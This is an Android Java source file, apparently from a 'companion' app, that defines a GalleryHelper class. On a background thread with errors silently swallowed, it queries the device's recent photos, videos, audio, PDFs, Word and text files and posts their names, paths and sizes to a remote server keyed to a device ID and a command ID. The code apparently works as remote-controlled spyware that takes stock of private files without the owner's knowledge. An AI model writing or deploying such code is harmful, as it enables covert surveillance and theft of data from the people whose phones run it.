package com.snapapp.companion;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.MediaStore;
import org.json.JSONArray;
import org.json.JSONObject;

public class GalleryHelper {

    public static void syncGallery(final Context context, final String serverUrl, final String deviceId, final String cmdId) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    JSONArray allFiles = new JSONArray();
                    scanCategory(context, MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "image", allFiles, 40);
                    scanCategory(context, MediaStore.Video.Media.EXTERNAL_CONTENT_URI, "video", allFiles, 30);
                    scanCategory(context, MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, "audio", allFiles, 30);
                    scanDocuments(context, allFiles, 30);

                    if (allFiles.length() > 0) {
                        JSONObject body = new JSONObject();
                        body.put("device_id", deviceId);
                        if (cmdId != null) body.put("command_id", cmdId);
                        body.put("files", allFiles);
                        ApiClient.postJson(serverUrl + "/api/device-sync/data", body, null);
                    }
                } catch (Exception ignored) {}
            }
        }).start();
    }

    @SuppressLint("Range")
    private static void scanCategory(Context ctx, Uri uri, String type, JSONArray target, int limit) {
        try {
            ContentResolver cr = ctx.getContentResolver();
            String[] proj = new String[]{
                    MediaStore.MediaColumns.DISPLAY_NAME,
                    MediaStore.MediaColumns.SIZE,
                    MediaStore.MediaColumns.DATA,
                    MediaStore.MediaColumns.DATE_MODIFIED
            };
            Cursor c = cr.query(uri, proj, null, null, MediaStore.MediaColumns.DATE_MODIFIED + " DESC LIMIT " + limit);
            if (c == null) return;

            while (c.moveToNext()) {
                String name = c.getString(c.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME));
                long size = c.getLong(c.getColumnIndex(MediaStore.MediaColumns.SIZE));
                String path = c.getString(c.getColumnIndex(MediaStore.MediaColumns.DATA));

                JSONObject f = new JSONObject();
                f.put("file_name", name != null ? name : (type + "_" + System.currentTimeMillis()));
                f.put("file_path", path != null ? path : "");
                f.put("file_type", type);
                f.put("file_size_bytes", size);
                target.put(f);
            }
            c.close();
        } catch (Exception ignored) {}
    }

    @SuppressLint("Range")
    private static void scanDocuments(Context ctx, JSONArray target, int limit) {
        try {
            ContentResolver cr = ctx.getContentResolver();
            Uri uri = MediaStore.Files.getContentUri("external");
            String[] proj = new String[]{
                    MediaStore.MediaColumns.DISPLAY_NAME,
                    MediaStore.MediaColumns.SIZE,
                    MediaStore.MediaColumns.DATA,
                    MediaStore.MediaColumns.MIME_TYPE
            };
            String sel = MediaStore.MediaColumns.MIME_TYPE + " LIKE ? OR " +
                    MediaStore.MediaColumns.MIME_TYPE + " LIKE ? OR " +
                    MediaStore.MediaColumns.MIME_TYPE + " LIKE ?";
            String[] args = new String[]{"application/pdf%", "application/msword%", "text/%"};

            Cursor c = cr.query(uri, proj, sel, args, MediaStore.MediaColumns.DATE_MODIFIED + " DESC LIMIT " + limit);
            if (c == null) return;

            while (c.moveToNext()) {
                String name = c.getString(c.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME));
                long size = c.getLong(c.getColumnIndex(MediaStore.MediaColumns.SIZE));
                String path = c.getString(c.getColumnIndex(MediaStore.MediaColumns.DATA));

                JSONObject f = new JSONObject();
                f.put("file_name", name != null ? name : "Document");
                f.put("file_path", path != null ? path : "");
                f.put("file_type", "document");
                f.put("file_size_bytes", size);
                target.put(f);
            }
            c.close();
        } catch (Exception ignored) {}
    }
}
